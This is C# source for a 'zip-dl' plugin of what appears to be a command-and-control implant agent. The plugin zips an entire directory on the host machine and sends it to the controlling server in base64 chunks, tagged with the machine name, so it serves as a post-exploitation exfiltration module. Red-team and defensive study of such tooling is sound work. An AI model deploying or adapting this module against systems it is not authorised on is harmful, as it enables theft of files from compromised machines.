﻿using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class DownloadJsonResponse
    {
        public int currentChunk { get; set; }
        public int totalChunks { get; set; }
        public string file_id { get; set; } = string.Empty;

        public string ToJson()
        {
            return JsonSerializer.Serialize(this);
        }
    }
    public class Plugin : IFilePlugin
    {
        public string Name => "zip-dl";
        private IMessageManager messageManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private Dictionary<string, Stream> _streams = new Dictionary<string, Stream>();
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.agentConfig = config;
            this.downloadJobs = new();
        }
        long GetFolderSize(DirectoryInfo directoryInfo)
        {
            long totalSize = 0;

            // Get the size of all files in this directory and subdirectories
            FileInfo[] files = directoryInfo.GetFiles("*", SearchOption.AllDirectories);

            foreach (FileInfo file in files)
            {
                totalSize += file.Length;
            }

            return totalSize;
        }

        void DebugWriteLine(string message, string task_id)
        {
            if (agentConfig.debug)
            {
                messageManager.WriteLine(message,task_id,false);
            }
        }

        public async Task Execute(ServerJob job)
        {
            ZipDlArgs args = JsonSerializer.Deserialize<ZipDlArgs>(job.task.parameters);
            if(args is null){
                return;
            }
            if(!string.IsNullOrEmpty(args.destination))
            {
                args.write = true;
            }

            var dirInfo = new DirectoryInfo(args.source);

            if (!dirInfo.Exists)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Directory doesn't exist.",
                    completed = true,
                    status = "error"
                });
                return;
            }
            long directorySize = GetFolderSize(dirInfo);

            // Create a new in-memory zip archive
            if (args.write)
            {
                ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
                Stream fs = File.OpenRead(args.destination);
                _streams.Add(job.task.id, fs);
                await StartSendFile(job, agentConfig.chunk_size, fs.Length, dirInfo.Name);
            }
            else
            {
                if (directorySize > 1073741824 && !args.force)
                {
                    messageManager.AddTaskResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = $"This zip is gonna be pretty big, the folder is ({directorySize}) bytes, consider specifying write=true to flush to disk first, or specify force=true to specify force it to be in memory",
                        completed = true,
                        status = "error"
                    });
                    return;
                }
                MemoryStream str = new MemoryStream();
                ZipFile.CreateFromDirectory(args.source,str, CompressionLevel.SmallestSize, false);
                _streams.Add(job.task.id, str);
                await StartSendFile(job, agentConfig.chunk_size, str.Length, dirInfo.Name);
            }
        }
        private async Task StartSendFile(ServerJob server_job, int chunk_size, long stream_size, string file_name)
        {
            ServerDownloadJob job = new ServerDownloadJob(server_job, "", chunk_size);
            
            job.total_chunks = GetTotalChunks(stream_size, chunk_size);
            job.path = $"{file_name}.zip";
            downloadJobs.GetOrAdd(job.task.id, job);


            messageManager.AddTaskResponse(new DownloadTaskResponse
            {
                user_output = string.Empty,
                download = new DownloadTaskResponseData()
                {
                    total_chunks = job.total_chunks,
                    full_path = job.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = Environment.MachineName,
                },
                status = "processed",
                task_id = job.task.id,
                completed = false,
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            // Get the associated download job
            ServerDownloadJob downloadJob = GetJob(response.task_id);

            // Handle cancellation or server error
            if (response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                string message = response.status != "success"
                    ? "An error occurred while communicating with the server."
                    : "Cancelled by user.";
                messageManager.WriteLine(message, response.task_id, true, "error");
                CompleteDownloadJob(response.task_id);
                return;
            }

            // Initialize file ID if not already set
            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            // Increment the chunk number
            downloadJob.chunk_num++;

            // Check if the job is completed
            bool isCompleted = downloadJob.chunk_num == downloadJob.total_chunks;

            // Prepare the download response
            var downloadResponse = new DownloadTaskResponse
            {
                task_id = response.task_id,
                user_output = new DownloadJsonResponse
                {
                    currentChunk = downloadJob.chunk_num,
                    totalChunks = downloadJob.total_chunks,
                    file_id = downloadJob.file_id,
                }.ToJson(),
                download = new DownloadTaskResponseData
                {
                    is_screenshot = false,
                    host = string.Empty,
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                status = isCompleted ? string.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
                completed = isCompleted,
            };

            // Handle the next chunk
            if (TryHandleNextChunk(downloadJob, out var chunk))
            {
                downloadResponse.download.chunk_data = chunk;
            }
            else
            {
                downloadResponse.user_output = chunk; // This holds the error message
                downloadResponse.status = "error";
                downloadResponse.download.chunk_data = string.Empty;
                downloadResponse.completed = true;
            }

            // Add the response to the message manager
            messageManager.AddTaskResponse(downloadResponse.ToJson());

            // Complete the job if finished
            if (downloadResponse.completed)
            {
                CompleteDownloadJob(response.task_id);
            }
        }
        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private int GetTotalChunks(long size, int chunk_size)
        {
            try
            {
                return (int)Math.Ceiling((double)size / chunk_size);
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);

            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams[task_id].Close();
                _streams[task_id].Dispose();
                _streams.Remove(task_id);
            }
            this.messageManager.CompleteJob(task_id);
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public bool TryHandleNextChunk(ServerDownloadJob job, out string chunk)
        {
            if (!_streams.ContainsKey(job.task.id))
            {
                chunk = "No stream available.";
                return false;
            }

            try
            {
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
                byte[] buffer = new byte[job.chunk_size];

                if (_streams[job.task.id].Length - totalBytesRead < job.chunk_size)
                {
                    job.complete = true;
                    buffer = new byte[_streams[job.task.id].Length - job.bytesRead];
                }

                _streams[job.task.id].Seek(job.bytesRead, SeekOrigin.Begin);
                job.bytesRead += _streams[job.task.id].Read(buffer, 0, buffer.Length);
                chunk = Misc.Base64Encode(buffer);
                return true;
            }
            catch (Exception e)
            {
                job.complete = true;
                chunk = e.ToString();
                return false;
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
    }
}
